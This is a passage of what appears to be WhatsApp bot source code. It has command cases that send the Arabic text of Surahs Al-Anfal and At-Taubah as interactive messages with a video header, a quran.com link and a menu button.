اِذْ يُغَشِّيْكُمُ النُّعَاسَ اَمَنَةً مِّنْهُ وَيُنَزِّلُ عَلَيْكُمْ مِّنَ السَّمَاۤءِ مَاۤءً لِّيُطَهِّرَكُمْ بِهٖ وَيُذْهِبَ عَنْكُمْ رِجْزَ الشَّيْطٰنِ وَلِيَرْبِطَ عَلٰى قُلُوْبِكُمْ وَيُثَبِّتَ بِهِ الْاَقْدَامَ
اِذْ يُوْحِيْ رَبُّكَ اِلَى الْمَلٰۤىِٕكَةِ اَنِّيْ مَعَكُمْ فَثَبِّتُوا الَّذِيْنَ اٰمَنُوْا ۗ سَاُلْقِيْ فِيْ قُلُوْبِ الَّذِيْنَ كَفَرُوا الرُّعْبَ فَاضْرِبُوْا فَوْقَ الْاَعْنَاقِ وَاضْرِبُوْا مِنْهُمْ كُلَّ بَنَانٍ
ذٰلِكَ بِاَنَّهُمْ شَاۤقُّوا اللّٰهَ وَرَسُوْلَهٗ ۚ وَمَنْ يُّشَاقِقِ اللّٰهَ وَرَسُوْلَهٗ فَاِنَّ اللّٰهَ شَدِيْدُ الْعِقَابِ
ذٰلِكُمْ فَذُوْقُوْهُ ۚ وَاَنَّ لِلْكٰفِرِيْنَ عَذَابَ النَّارِ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْٓا اِذَا لَقِيْتُمُ الَّذِيْنَ كَفَرُوْا زَحْفًا فَلَا تُوَلُّوْهُمُ الْاَدْبَارَ
وَمَنْ يُّوَلِّهِمْ يَوْمَىِٕذٍ دُبُرَهٗٓ اِلَّا مُتَحَرِّفًا لِّقِتَالٍ اَوْ مُتَحَيِّزًا اِلٰى فِئَةٍ فَقَدْ بَاۤءَ بِغَضَبٍ مِّنَ اللّٰهِ وَمَأْوٰىهُ جَهَنَّمُ ۗ وَبِئْسَ الْمَصِيْرُ
فَلَمْ تَقْتُلُوْهُمْ وَلٰكِنَّ اللّٰهَ قَتَلَهُمْ ۖ وَمَا رَمَيْتَ اِذْ رَمَيْتَ وَلٰكِنَّ اللّٰهَ رَمٰى ۚ وَلِيُبْلِيَ الْمُؤْمِنِيْنَ مِنْهُ بَلَاۤءً حَسَنًا ۗ اِنَّ اللّٰهَ سَمِيْعٌ عَلِيْمٌ
ذٰلِكُمْ وَاَنَّ اللّٰهَ مُوْهِنُ كَيْدِ الْكٰفِرِيْنَ
اِنْ تَسْتَفْتِحُوْا فَقَدْ جَاۤءَكُمُ الْفَتْحُ ۚ وَاِنْ تَنْتَهُوْا فَهُوَ خَيْرٌ لَّكُمْ ۚ وَاِنْ تَعُوْدُوْا نَعُدْ ۚ وَلَنْ تُغْنِيَ عَنْكُمْ فِئَتُكُمْ شَيْـًٔا وَّلَوْ كَثُرَتْ ۙ وَاَنَّ اللّٰهَ مَعَ الْمُؤْمِنِيْنَ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْٓا اَطِيْعُوا اللّٰهَ وَرَسُوْلَهٗ وَلَا تَوَلَّوْا عَنْهُ وَاَنْتُمْ تَسْمَعُوْنَ
وَلَا تَكُوْنُوْا كَالَّذِيْنَ قَالُوْا سَمِعْنَا وَهُمْ لَا يَسْمَعُوْنَ
اِنَّ شَرَّ الدَّوَاۤبِّ عِنْدَ اللّٰهِ الصُّمُّ الْبُكْمُ الَّذِيْنَ لَا يَعْقِلُوْنَ
وَلَوْ عَلِمَ اللّٰهُ فِيْهِمْ خَيْرًا لَّاَسْمَعَهُمْ ۗ وَلَوْ اَسْمَعَهُمْ لَتَوَلَّوْا وَّهُمْ مُّعْرِضُوْنَ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوا اسْتَجِيْبُوْا لِلّٰهِ وَلِلرَّسُوْلِ اِذَا دَعَاكُمْ لِمَا يُحْيِيْكُمْ ۚ وَاعْلَمُوْٓا اَنَّ اللّٰهَ يَحُوْلُ بَيْنَ الْمَرْءِ وَقَلْبِهٖ وَاَنَّهٗٓ اِلَيْهِ تُحْشَرُوْنَ
وَاتَّقُوْا فِتْنَةً لَّا تُصِيْبَنَّ الَّذِيْنَ ظَلَمُوْا مِنْكُمْ خَاۤصَّةً ۚ وَاعْلَمُوْٓا اَنَّ اللّٰهَ شَدِيْدُ الْعِقَابِ
وَاذْكُرُوْٓا اِذْ اَنْتُمْ قَلِيْلٌ مُّسْتَضْعَفُوْنَ فِى الْاَرْضِ تَخَافُوْنَ اَنْ يَّتَخَطَّفَكُمُ النَّاسُ فَاٰوٰىكُمْ وَاَيَّدَكُمْ بِنَصْرِهٖ وَرَزَقَكُمْ مِّنَ الطَّيِّبٰتِ لَعَلَّكُمْ تَشْكُرُوْنَ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا لَا تَخُوْنُوا اللّٰهَ وَالرَّسُوْلَ وَتَخُوْنُوْٓا اَمٰنٰتِكُمْ وَاَنْتُمْ تَعْلَمُوْنَ
وَاعْلَمُوْٓا اَنَّمَآ اَمْوَالُكُمْ وَاَوْلَادُكُمْ فِتْنَةٌ ۙ وَّاَنَّ اللّٰهَ عِنْدَهٗٓ اَجْرٌ عَظِيْمٌ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْٓا اِنْ تَتَّقُوا اللّٰهَ يَجْعَلْ لَّكُمْ فُرْقَانًا وَّيُكَفِّرْ عَنْكُمْ سَيِّاٰتِكُمْ وَيَغْفِرْ لَكُمْ ۗ وَاللّٰهُ ذُو الْفَضْلِ الْعَظِيْمِ
وَاِذْ يَمْكُرُ بِكَ الَّذِيْنَ كَفَرُوْا لِيُثْبِتُوْكَ اَوْ يَقْتُلُوْكَ اَوْ يُخْرِجُوْكَ ۗ وَيَمْكُرُوْنَ وَيَمْكُرُ اللّٰهُ ۗ وَاللّٰهُ خَيْرُ الْمٰكِرِيْنَ
وَاِذَا تُتْلٰى عَلَيْهِمْ اٰيٰتُنَا قَالُوْا قَدْ سَمِعْنَا لَوْ نَشَاۤءُ لَقُلْنَا مِثْلَ هٰذَآ ۙ اِنْ هٰذَآ اِلَّآ اَسَاطِيْرُ الْاَوَّلِيْنَ
وَاِذْ قَالُوا اللّٰهُمَّ اِنْ كَانَ هٰذَا هُوَ الْحَقَّ مِنْ عِنْدِكَ فَاَمْطِرْ عَلَيْنَا حِجَارَةً مِّنَ السَّمَاۤءِ اَوِ ائْتِنَا بِعَذَابٍ اَلِيْمٍ
وَمَا كَانَ اللّٰهُ لِيُعَذِّبَهُمْ وَاَنْتَ فِيْهِمْ ۚ وَمَا كَانَ اللّٰهُ مُعَذِّبَهُمْ وَهُمْ يَسْتَغْفِرُوْنَ
وَمَا لَهُمْ اَلَّا يُعَذِّبَهُمُ اللّٰهُ وَهُمْ يَصُدُّوْنَ عَنِ الْمَسْجِدِ الْحَرَامِ وَمَا كَانُوْٓا اَوْلِيَاۤءَهٗ ۗ اِنْ اَوْلِيَاۤؤُهٗٓ اِلَّا الْمُتَّقُوْنَ وَلٰكِنَّ اَكْثَرَهُمْ لَا يَعْلَمُوْنَ
وَمَا كَانَ صَلَاتُهُمْ عِنْدَ الْبَيْتِ اِلَّا مُكَاۤءً وَّتَصْدِيَةً ۗ فَذُوْقُوا الْعَذَابَ بِمَا كُنْتُمْ تَكْفُرُوْنَ
اِنَّ الَّذِيْنَ كَفَرُوْا يُنْفِقُوْنَ اَمْوَالَهُمْ لِيَصُدُّوْا عَنْ سَبِيْلِ اللّٰهِ ۗ فَسَيُنْفِقُوْنَهَا ثُمَّ تَكُوْنُ عَلَيْهِمْ حَسْرَةً ثُمَّ يُغْلَبُوْنَ ۗ وَالَّذِيْنَ كَفَرُوْٓا اِلٰى جَهَنَّمَ يُحْشَرُوْنَ
لِيَمِيْزَ اللّٰهُ الْخَبِيْثَ مِنَ الطَّيِّبِ وَيَجْعَلَ الْخَبِيْثَ بَعْضَهٗ عَلٰى بَعْضٍ فَيَرْكُمَهٗ جَمِيْعًا فَيَجْعَلَهٗ فِيْ جَهَنَّمَ ۗ اُولٰۤىِٕكَ هُمُ الْخٰسِرُوْنَ
قُلْ لِّلَّذِيْنَ كَفَرُوْٓا اِنْ يَّنْتَهُوْا يُغْفَرْ لَهُمْ مَّا قَدْ سَلَفَ ۚ وَاِنْ يَّعُوْدُوْا فَقَدْ مَضَتْ سُنَّتُ الْاَوَّلِيْنَ
وَقَاتِلُوْهُمْ حَتّٰى لَا تَكُوْنَ فِتْنَةٌ وَّيَكُوْنَ الدِّيْنُ كُلُّهٗ لِلّٰهِ ۚ فَاِنِ انْتَهَوْا فَاِنَّ اللّٰهَ بِمَا يَعْمَلُوْنَ بَصِيْرٌ
وَاِنْ تَوَلَّوْا فَاعْلَمُوْٓا اَنَّ اللّٰهَ مَوْلٰىكُمْ ۚ نِعْمَ الْمَوْلٰى وَنِعْمَ النَّصِيْرُ
وَاعْلَمُوْٓا اَنَّمَا غَنِمْتُمْ مِّنْ شَيْءٍ فَاَنَّ لِلّٰهِ خُمُسَهٗ وَلِلرَّسُوْلِ وَلِذِى الْقُرْبٰى وَالْيَتٰمٰى وَالْمَسٰكِيْنِ وَابْنِ السَّبِيْلِ ۙ اِنْ كُنْتُمْ اٰمَنْتُمْ بِاللّٰهِ وَمَآ اَنْزَلْنَا عَلٰى عَبْدِنَا يَوْمَ الْفُرْقَانِ يَوْمَ الْتَقَى الْجَمْعٰنِ ۗ وَاللّٰهُ عَلٰى كُلِّ شَيْءٍ قَدِيْرٌ
اِذْ اَنْتُمْ بِالْعُدْوَةِ الدُّنْيَا وَهُمْ بِالْعُدْوَةِ الْقُصْوٰى وَالرَّكْبُ اَسْفَلَ مِنْكُمْ ۗ وَلَوْ تَوَاعَدْتُّمْ لَاخْتَلَفْتُمْ فِى الْمِيْعَادِ ۙ وَلٰكِنْ لِّيَقْضِيَ اللّٰهُ اَمْرًا كَانَ مَفْعُوْلًا ۙ لِّيَهْلِكَ مَنْ هَلَكَ عَنْۢ بَيِّنَةٍ وَّيَحْيٰى مَنْ حَيَّ عَنْۢ بَيِّنَةٍ ۗ وَاِنَّ اللّٰهَ لَسَمِيْعٌ عَلِيْمٌ
اِذْ يُرِيْكَهُمُ اللّٰهُ فِيْ مَنَامِكَ قَلِيْلًا ۚ وَلَوْ اَرٰىكَهُمْ كَثِيْرًا لَّفَشِلْتُمْ وَلَتَنَازَعْتُمْ فِى الْاَمْرِ وَلٰكِنَّ اللّٰهَ سَلَّمَ ۗ اِنَّهٗ عَلِيْمٌ ۢ بِذَاتِ الصُّدُوْرِ
وَاِذْ يُرِيْكُمُوْهُمْ اِذِ الْتَقَيْتُمْ فِيْٓ اَعْيُنِكُمْ قَلِيْلًا وَّيُقَلِّلُكُمْ فِيْٓ اَعْيُنِهِمْ لِيَقْضِيَ اللّٰهُ اَمْرًا كَانَ مَفْعُوْلًا ۗ وَاِلَى اللّٰهِ تُرْجَعُ الْاُمُوْرُ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْٓا اِذَا لَقِيْتُمْ فِئَةً فَاثْبُتُوْا وَاذْكُرُوا اللّٰهَ كَثِيْرًا لَّعَلَّكُمْ تُفْلِحُوْنَ
وَاَطِيْعُوا اللّٰهَ وَرَسُوْلَهٗ وَلَا تَنَازَعُوْا فَتَفْشَلُوْا وَتَذْهَبَ رِيْحُكُمْ وَاصْبِرُوْا ۗ اِنَّ اللّٰهَ مَعَ الصّٰبِرِيْنَ
وَلَا تَكُوْنُوْا كَالَّذِيْنَ خَرَجُوْا مِنْ دِيَارِهِمْ بَطَرًا وَّرِئَاۤءَ النَّاسِ وَيَصُدُّوْنَ عَنْ سَبِيْلِ اللّٰهِ ۗ وَاللّٰهُ بِمَا يَعْمَلُوْنَ مُحِيْطٌ
وَاِذْ زَيَّنَ لَهُمُ الشَّيْطٰنُ اَعْمَالَهُمْ وَقَالَ لَا غَالِبَ لَكُمُ الْيَوْمَ مِنَ النَّاسِ وَاِنِّيْ جَارٌ لَّكُمْ ۚ فَلَمَّا تَرَاۤءَتِ الْفِئَتٰنِ نَكَصَ عَلٰى عَقِبَيْهِ وَقَالَ اِنِّيْ بَرِيْۤءٌ مِّنْكُمْ ۚ اِنِّيْٓ اَرٰى مَا لَا تَرَوْنَ ۚ اِنِّيْٓ اَخَافُ اللّٰهَ ۗ وَاللّٰهُ شَدِيْدُ الْعِقَابِ
اِذْ يَقُوْلُ الْمُنٰفِقُوْنَ وَالَّذِيْنَ فِيْ قُلُوْبِهِمْ مَّرَضٌ غَرَّ هٰٓؤُلَاۤءِ دِيْنُهُمْ ۗ وَمَنْ يَّتَوَكَّلْ عَلَى اللّٰهِ فَاِنَّ اللّٰهَ عَزِيْزٌ حَكِيْمٌ
وَلَوْ تَرٰىٓ اِذْ يَتَوَفَّى الَّذِيْنَ كَفَرُوا الْمَلٰۤىِٕكَةُ يَضْرِبُوْنَ وُجُوْهَهُمْ وَاَدْبَارَهُمْ ۚ وَذُوْقُوْا عَذَابَ الْحَرِيْقِ
ذٰلِكَ بِمَا قَدَّمَتْ اَيْدِيْكُمْ وَاَنَّ اللّٰهَ لَيْسَ بِظَلَّامٍ لِّلْعَبِيْدِ
كَـدَأْبِ اٰلِ فِرْعَوْنَ ۙ وَالَّذِيْنَ مِنْ قَبْلِهِمْ ۗ كَفَرُوْا بِاٰيٰتِ اللّٰهِ فَاَخَذَهُمُ اللّٰهُ بِذُنُوْبِهِمْ ۗ اِنَّ اللّٰهَ قَوِيٌّ شَدِيْدُ الْعِقَابِ
ذٰلِكَ بِاَنَّ اللّٰهَ لَمْ يَكُ مُغَيِّرًا نِّعْمَةً اَنْعَمَهَا عَلٰى قَوْمٍ حَتّٰى يُغَيِّرُوْا مَا بِاَنْفُسِهِمْ ۙ وَاَنَّ اللّٰهَ سَمِيْعٌ عَلِيْمٌ
كَـدَأْبِ اٰلِ فِرْعَوْنَ ۙ وَالَّذِيْنَ مِنْ قَبْلِهِمْ ۗ كَذَّبُوْا بِاٰيٰتِ رَبِّهِمْ فَاَهْلَكْنٰهُمْ بِذُنُوْبِهِمْ وَاَغْرَقْنَآ اٰلَ فِرْعَوْنَ ۚ وَكُلٌّ كَانُوْا ظٰلِمِيْنَ
اِنَّ شَرَّ الدَّوَاۤبِّ عِنْدَ اللّٰهِ الَّذِيْنَ كَفَرُوْا فَهُمْ لَا يُؤْمِنُوْنَ
اَلَّذِيْنَ عٰهَدْتَّ مِنْهُمْ ثُمَّ يَنْقُضُوْنَ عَهْدَهُمْ فِيْ كُلِّ مَرَّةٍ وَّهُمْ لَا يَتَّقُوْنَ
فَاِمَّا تَثْقَفَنَّهُمْ فِى الْحَرْبِ فَشَرِّدْ بِهِمْ مَّنْ خَلْفَهُمْ لَعَلَّهُمْ يَذَّكَّرُوْنَ
وَاِمَّا تَخَافَنَّ مِنْ قَوْمٍ خِيَانَةً فَانْۢبِذْ اِلَيْهِمْ عَلٰى سَوَاۤءٍ ۗ اِنَّ اللّٰهَ لَا يُحِبُّ الْخَاۤىِٕنِيْنَ
وَلَا يَحْسَبَنَّ الَّذِيْنَ كَفَرُوْا سَبَقُوْا ۗ اِنَّهُمْ لَا يُعْجِزُوْنَ
وَاَعِدُّوْا لَهُمْ مَّا اسْتَطَعْتُمْ مِّنْ قُوَّةٍ وَّمِنْ رِّبَاطِ الْخَيْلِ تُرْهِبُوْنَ بِهٖ عَدُوَّ اللّٰهِ وَعَدُوَّكُمْ وَاٰخَرِيْنَ مِنْ دُوْنِهِمْ ۚ لَا تَعْلَمُوْنَهُمُ اللّٰهُ يَعْلَمُهُمْ ۗ وَمَا تُنْفِقُوْا مِنْ شَيْءٍ فِيْ سَبِيْلِ اللّٰهِ يُوَفَّ اِلَيْكُمْ وَاَنْتُمْ لَا تُظْلَمُوْنَ
وَاِنْ جَنَحُوْا لِلسَّلْمِ فَاجْنَحْ لَهَا وَتَوَكَّلْ عَلَى اللّٰهِ ۗ اِنَّهٗ هُوَ السَّمِيْعُ الْعَلِيْمُ
وَاِنْ يُّرِيْدُوْٓا اَنْ يَّخْدَعُوْكَ فَاِنَّ حَسْبَكَ اللّٰهُ ۗ هُوَ الَّذِيْٓ اَيَّدَكَ بِنَصْرِهٖ وَبِالْمُؤْمِنِيْنَ
وَاَلَّفَ بَيْنَ قُلُوْبِهِمْ ۗ لَوْ اَنْفَقْتَ مَا فِى الْاَرْضِ جَمِيْعًا مَّآ اَلَّفْتَ بَيْنَ قُلُوْبِهِمْ وَلٰكِنَّ اللّٰهَ اَلَّفَ بَيْنَهُمْ ۗ اِنَّهٗ عَزِيْزٌ حَكِيْمٌ
يٰٓاَيُّهَا النَّبِيُّ حَسْبُكَ اللّٰهُ وَمَنِ اتَّبَعَكَ مِنَ الْمُؤْمِنِيْنَ
يٰٓاَيُّهَا النَّبِيُّ حَرِّضِ الْمُؤْمِنِيْنَ عَلَى الْقِتَالِ ۗ اِنْ يَّكُنْ مِّنْكُمْ عِشْرُوْنَ صٰبِرُوْنَ يَغْلِبُوْا مِائَتَيْنِ ۚ وَاِنْ يَّكُنْ مِّنْكُمْ مِّائَةٌ يَّغْلِبُوْٓا اَلْفًا مِّنَ الَّذِيْنَ كَفَرُوْا بِاَنَّهُمْ قَوْمٌ لَّا يَفْقَهُوْنَ
اَلْـٰٔنَ خَفَّفَ اللّٰهُ عَنْكُمْ وَعَلِمَ اَنَّ فِيْكُمْ ضَعْفًا ۗ فَاِنْ يَّكُنْ مِّنْكُمْ مِّائَةٌ صَابِرَةٌ يَّغْلِبُوْا مِائَتَيْنِ ۚ وَاِنْ يَّكُنْ مِّنْكُمْ اَلْفٌ يَّغْلِبُوْٓا اَلْفَيْنِ بِاِذْنِ اللّٰهِ ۗ وَاللّٰهُ مَعَ الصّٰبِرِيْنَ
مَا كَانَ لِنَبِيٍّ اَنْ يَّكُوْنَ لَهٗٓ اَسْرٰى حَتّٰى يُثْخِنَ فِى الْاَرْضِ ۗ تُرِيْدُوْنَ عَرَضَ الدُّنْيَا وَاللّٰهُ يُرِيْدُ الْاٰخِرَةَ ۗ وَاللّٰهُ عَزِيْزٌ حَكِيْمٌ
لَوْلَا كِتٰبٌ مِّنَ اللّٰهِ سَبَقَ لَمَسَّكُمْ فِيْمَآ اَخَذْتُمْ عَذَابٌ عَظِيْمٌ
فَكُلُوْا مِمَّا غَنِمْتُمْ حَلٰلًا طَيِّبًا ۖ وَّاتَّقُوا اللّٰهَ ۗ اِنَّ اللّٰهَ غَفُوْرٌ رَّحِيْمٌ
يٰٓاَيُّهَا النَّبِيُّ قُلْ لِّمَنْ فِيْٓ اَيْدِيْكُمْ مِّنَ الْاَسْرٰىٓ اِنْ يَّعْلَمِ اللّٰهُ فِيْ قُلُوْبِكُمْ خَيْرًا يُّؤْتِكُمْ خَيْرًا مِّمَّآ اُخِذَ مِنْكُمْ وَيَغْفِرْ لَكُمْ ۗ وَاللّٰهُ غَفُوْرٌ رَّحِيْمٌ
وَاِنْ يُّرِيْدُوْا خِيَانَتَكَ فَقَدْ خَانُوا اللّٰهَ مِنْ قَبْلُ فَاَمْكَنَ مِنْهُمْ ۗ وَاللّٰهُ عَلِيْمٌ حَكِيْمٌ
اِنَّ الَّذِيْنَ اٰمَنُوْا وَهَاجَرُوْا وَجَاهَدُوْا بِاَمْوَالِهِمْ وَاَنْفُسِهِمْ فِيْ سَبِيْلِ اللّٰهِ وَالَّذِيْنَ اٰوَوْا وَّنَصَرُوْٓا اُولٰۤىِٕكَ بَعْضُهُمْ اَوْلِيَاۤءُ بَعْضٍ ۗ وَالَّذِيْنَ اٰمَنُوْا وَلَمْ يُهَاجِرُوْا مَا لَكُمْ مِّنْ وَّلَايَتِهِمْ مِّنْ شَيْءٍ حَتّٰى يُهَاجِرُوْا ۚ وَاِنِ اسْتَنْصَرُوْكُمْ فِى الدِّيْنِ فَعَلَيْكُمُ النَّصْرُ اِلَّا عَلٰى قَوْمٍۢ بَيْنَكُمْ وَبَيْنَهُمْ مِّيْثَاقٌ ۗ وَاللّٰهُ بِمَا تَعْمَلُوْنَ بَصِيْرٌ
وَالَّذِيْنَ كَفَرُوْا بَعْضُهُمْ اَوْلِيَاۤءُ بَعْضٍ ۗ اِلَّا تَفْعَلُوْهُ تَكُنْ فِتْنَةٌ فِى الْاَرْضِ وَفَسَادٌ كَبِيْرٌ
وَالَّذِيْنَ اٰمَنُوْا وَهَاجَرُوْا وَجَاهَدُوْا فِيْ سَبِيْلِ اللّٰهِ وَالَّذِيْنَ اٰوَوْا وَّنَصَرُوْٓا اُولٰۤىِٕكَ هُمُ الْمُؤْمِنُوْنَ حَقًّا ۗ لَهُمْ مَّغْفِرَةٌ وَّرِزْقٌ كَرِيْمٌ
وَالَّذِيْنَ اٰمَنُوْا مِنْۢ بَعْدُ وَهَاجَرُوْا وَجَاهَدُوْا مَعَكُمْ فَاُولٰۤىِٕكَ مِنْكُمْ ۗ وَاُولُو الْاَرْحَامِ بَعْضُهُمْ اَوْلٰى بِبَعْضٍ فِيْ كِتٰبِ اللّٰهِ ۗ اِنَّ اللّٰهَ بِكُلِّ شَيْءٍ عَلِيْمٌ

\`[📖] 𝐒𝐇𝐀𝐃𝐀𝐐𝐀𝐋𝐀𝐇𝐔𝐋 '𝐀𝐃𝐙𝐈𝐌 [📖]\`
`

 const msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: ""
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: teks
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 hasMediaAttachment: true,
 videoMessage: (
 await prepareWAMessageMedia(
 { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778780066699.mp4" } },
 { upload: Asepp.waUploadToServer }
 )
 ).videoMessage,
 gifPlayback: true
 }),
 contextInfo: {
 isForwarded: true,
 forwardingScore: 999,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363418538598013@newsletter',
 newsletterName: '𝐀𝐋-𝐐𝐔𝐑𝐀𝐍',
 serverMessageId: 145
 }
 },
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 messageParamsJson: JSON.stringify({
 limited_time_offer: {
 text: "𝐀𝐋-𝐀𝐍𝐅𝐀𝐋",
 url: `https://quran.com/8`,
 copy_code: "BISMILLAH",
 expiration_time: Date.now() * 999
 },
 bottom_sheet: {
 in_thread_buttons_limit: 1,
 divider_indices: [0],
 list_title: "CLICK",
 button_title: "© AL-ANFAL"
 }
 }),
 buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "© AL-ANFAL",
 sections: [{
 title: "Menu Surat",
 highlight_label: "𝐁𝐀𝐂𝐀 𝐋𝐄𝐍𝐆𝐊𝐀𝐏 🚀",
 rows: [
 { title: "𝐓𝐞𝐤𝐬 𝐀𝐫𝐚𝐛", description: "𝐀𝐲𝐚𝐭 1-75", id: `${prefix}al-anfal` }
 ]
 }]
 })
 }
 ]
 })
 })
 }
 }
 },
 { quoted: m }
 )

 await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

 await Asepp.sendMessage(
 m.chat,
 {
 audio: fs.readFileSync("./image/kacaw.mp3"),
 mimetype: "audio/mp4",
 ptt: false
 },
 { quoted: m }
 )
}
break

case 'at-taubah':
case 'attaubah':
case 'taubah': {
 await Asepp.sendMessage(m.chat, { react: { text: "📖", key: m.key } })

 let teks = `\`𝗦𝗨𝗥𝗔𝗧 𝗔𝗧-𝗧𝗔𝗨𝗕𝗔𝗛\`
Surat ke-9 | 129 ayat | Madaniyah | Pengampunan

⌲ \`𝐓𝐄𝐊𝐒 𝐀𝐑𝐀𝐁 𝐋𝐄𝐍𝐆𝐊𝐀𝐏\`
بَرَاۤءَةٌ مِّنَ اللّٰهِ وَرَسُوْلِهٖٓ اِلَى الَّذِيْنَ عَاهَدْتُّمْ مِّنَ الْمُشْرِكِيْنَ
فَسِيْحُوْا فِى الْاَرْضِ اَرْبَعَةَ اَشْهُرٍ وَّاعْلَمُوْٓا اَنَّكُمْ غَيْرُ مُعْجِزِى اللّٰهِ ۙ وَاَنَّ اللّٰهَ مُخْزِى الْكٰفِرِيْنَ
وَاَذَانٌ مِّنَ اللّٰهِ وَرَسُوْلِهٖٓ اِلَى النَّاسِ يَوْمَ الْحَجِّ الْاَكْبَرِ اَنَّ اللّٰهَ بَرِيْۤءٌ مِّنَ الْمُشْرِكِيْنَ ۙ وَرَسُوْلُهٗ ۗ فَاِنْ تُبْتُمْ فَهُوَ خَيْرٌ لَّكُمْ ۚ وَاِنْ تَوَلَّيْتُمْ فَاعْلَمُوْٓا اَنَّكُمْ غَيْرُ مُعْجِزِى اللّٰهِ ۗ وَبَشِّرِ الَّذِيْنَ كَفَرُوْا بِعَذَابٍ اَلِيْمٍ
اِلَّا الَّذِيْنَ عَاهَدْتُّمْ مِّنَ الْمُشْرِكِيْنَ ثُمَّ لَمْ يَنْقُصُوْكُمْ شَيْـًٔا وَّلَمْ يُظَاهِرُوْا عَلَيْكُمْ اَحَدًا فَاَتِمُّوْٓا اِلَيْهِمْ عَهْدَهُمْ اِلٰى مُدَّتِهِمْ ۗ اِنَّ اللّٰهَ يُحِبُّ الْمُتَّقِيْنَ
فَاِذَا انْسَلَخَ الْاَشْهُرُ الْحُرُمُ فَاقْتُلُوا الْمُشْرِكِيْنَ حَيْثُ وَجَدْتُّمُوْهُمْ وَخُذُوْهُمْ وَاحْصُرُوْهُمْ وَاقْعُدُوْا لَهُمْ كُلَّ مَرْصَدٍ ۚ فَاِنْ تَابُوْا وَاَقَامُوا الصَّلٰوةَ وَاٰتَوُا الزَّكٰوةَ فَخَلُّوْا سَبِيْلَهُمْ ۗ اِنَّ اللّٰهَ غَفُوْرٌ رَّحِيْمٌ
وَاِنْ اَحَدٌ مِّنَ الْمُشْرِكِيْنَ اسْتَجَارَكَ فَاَجِرْهُ حَتّٰى يَسْمَعَ كَلَامَ اللّٰهِ ثُمَّ اَبْلِغْهُ مَأْمَنَهٗ ۗ ذٰلِكَ بِاَنَّهُمْ قَوْمٌ لَّا يَعْلَمُوْنَ
كَيْفَ يَكُوْنُ لِلْمُشْرِكِيْنَ عَهْدٌ عِنْدَ اللّٰهِ وَعِنْدَ رَسُوْلِهٖٓ اِلَّا الَّذِيْنَ عَاهَدْتُّمْ عِنْدَ الْمَسْجِدِ الْحَرَامِ ۚ فَمَا اسْتَقَامُوْا لَكُمْ فَاسْتَقِيْمُوْا لَهُمْ ۗ اِنَّ اللّٰهَ يُحِبُّ الْمُتَّقِيْنَ
كَيْفَ وَاِنْ يَّظْهَرُوْا عَلَيْكُمْ لَا يَرْقُبُوْا فِيْكُمْ اِلًّا وَّلَا ذِمَّةً ۗ يُرْضُوْنَكُمْ بِاَفْوَاهِهِمْ وَتَأْبٰى قُلُوْبُهُمْ ۚ وَاَكْثَرُهُمْ فٰسِقُوْنَ
اشْتَرَوْا بِاٰيٰتِ اللّٰهِ ثَمَنًا قَلِيْلًا فَصَدُّوْا عَنْ سَبِيْلِهٖ ۗ اِنَّهُمْ سَاۤءَ مَا كَانُوْا يَعْمَلُوْنَ
لَا يَرْقُبُوْنَ فِيْ مُؤْمِنٍ اِلًّا وَّلَا ذِمَّةً ۗ وَاُولٰۤىِٕكَ هُمُ الْمُعْتَدُوْنَ
فَاِنْ تَابُوْا وَاَقَامُوا الصَّلٰوةَ وَاٰتَوُا الزَّكٰوةَ فَاِخْوَانُكُمْ فِى الدِّيْنِ ۗ وَنُفَصِّلُ الْاٰيٰتِ لِقَوْمٍ يَّعْلَمُوْنَ
وَاِنْ نَّكَثُوْٓا اَيْمَانَهُمْ مِّنْۢ بَعْدِ عَهْدِهِمْ وَطَعَنُوْا فِيْ دِيْنِكُمْ فَقَاتِلُوْٓا اَىِٕمَّةَ الْكُفْرِ ۙ اِنَّهُمْ لَآ اَيْمَانَ لَهُمْ لَعَلَّهُمْ يَنْتَهُوْنَ
اَلَا تُقَاتِلُوْنَ قَوْمًا نَّكَثُوْٓا اَيْمَانَهُمْ وَهَمُّوْا بِاِخْرَاجِ الرَّسُوْلِ وَهُمْ بَدَءُوْكُمْ اَوَّلَ مَرَّةٍ ۗ اَتَخْشَوْنَهُمْ ۚ فَاللّٰهُ اَحَقُّ اَنْ تَخْشَوْهُ اِنْ كُنْتُمْ مُّؤْمِنِيْنَ
قَاتِلُوْهُمْ يُعَذِّبْهُمُ اللّٰهُ بِاَيْدِيْكُمْ وَيُخْزِهِمْ وَيَنْصُرْكُمْ عَلَيْهِمْ وَيَشْفِ صُدُوْرَ قَوْمٍ مُّؤْمِنِيْنَ
وَيُذْهِبْ غَيْظَ قُلُوْبِهِمْ ۗ وَيَتُوْبُ اللّٰهُ عَلٰى مَنْ يَّشَاۤءُ ۗ وَاللّٰهُ عَلِيْمٌ حَكِيْمٌ
اَمْ حَسِبْتُمْ اَنْ تُتْرَكُوْا وَلَمَّا يَعْلَمِ اللّٰهُ الَّذِيْنَ جَاهَدُوْا مِنْكُمْ وَلَمْ يَتَّخِذُوْا مِنْ دُوْنِ اللّٰهِ وَلَا رَسُوْلِهٖ وَلَا الْمُؤْمِنِيْنَ وَلِيْجَةً ۗ وَاللّٰهُ خَبِيْرٌۢ بِمَا تَعْمَلُوْنَ
مَا كَانَ لِلْمُشْرِكِيْنَ اَنْ يَّعْمُرُوْا مَسٰجِدَ اللّٰهِ شٰهِدِيْنَ عَلٰٓى اَنْفُسِهِمْ بِالْكُفْرِ ۗ اُولٰۤىِٕكَ حَبِطَتْ اَعْمَالُهُمْ ۖ وَفِى النَّارِ هُمْ خٰلِدُوْنَ
